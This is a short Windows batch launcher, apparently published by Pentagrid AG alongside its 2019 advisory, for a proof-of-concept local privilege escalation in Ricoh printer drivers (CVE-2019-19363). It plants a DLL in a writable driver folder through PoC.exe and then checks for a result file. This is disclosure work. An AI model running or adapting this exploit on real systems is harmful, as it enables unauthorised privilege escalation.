REM This example batch script executes the proof of concept exploit.
REM Written by Pentagrid AG, 2019.
REM See https://pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/

SET DLL=watermark.dll
SET STEPS=2

SET PRINTERNAME=RICOH PCL6 UniversalDriver V4.23
REM SET PRINTERNAME=RICOH Aficio SP 8300DN PCL 6
REM SET PRINTERNAME=RICOH P 501 PCL 6
REM SET PRINTERNAME=RICOH MP C6503 PCL 6


PoC.exe ^
   "%PRINTERNAME%" ^
   "C:\ProgramData\RICOH_DRV\%PRINTERNAME%\_common\dlz\%DLL%" ^
   "RICOH_DRV\%PRINTERNAME%\_common\dlz\%DLL%" ^
   Dll.dll ^
   %STEPS%

REM Wait for a moment
timeout /t 5
dir c:\result.txt
